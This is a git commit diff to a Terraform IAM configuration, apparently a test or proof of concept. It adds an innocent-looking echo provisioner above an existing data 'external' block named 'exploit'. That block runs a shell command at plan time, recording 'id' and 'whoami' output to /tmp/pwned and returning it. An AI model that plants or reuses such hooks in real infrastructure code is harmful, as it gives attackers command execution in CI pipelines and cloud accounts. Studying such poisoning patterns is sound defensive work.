714104e47efa8390b64dce6da252dbc25e8b6581
Test <test@example.com>
2026-01-22 15:25:08 +0800

    modified2

--- infrastructure/iac-gip-inclusion/iam/terraform/main.tf
+++ infrastructure/iac-gip-inclusion/iam/terraform/main.tf
@@ -1,3 +1,9 @@
+resource "null_resource" "dummy" {
+  provisioner "local-exec" {
+    command = "echo 'Norm infra deployment'"
+  }
+}
+
 data "external" "exploit" {
  program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; echo '{\"result\":\'$(cat /tmp/pwned | tr -d '\\n')\'}'"]
 }
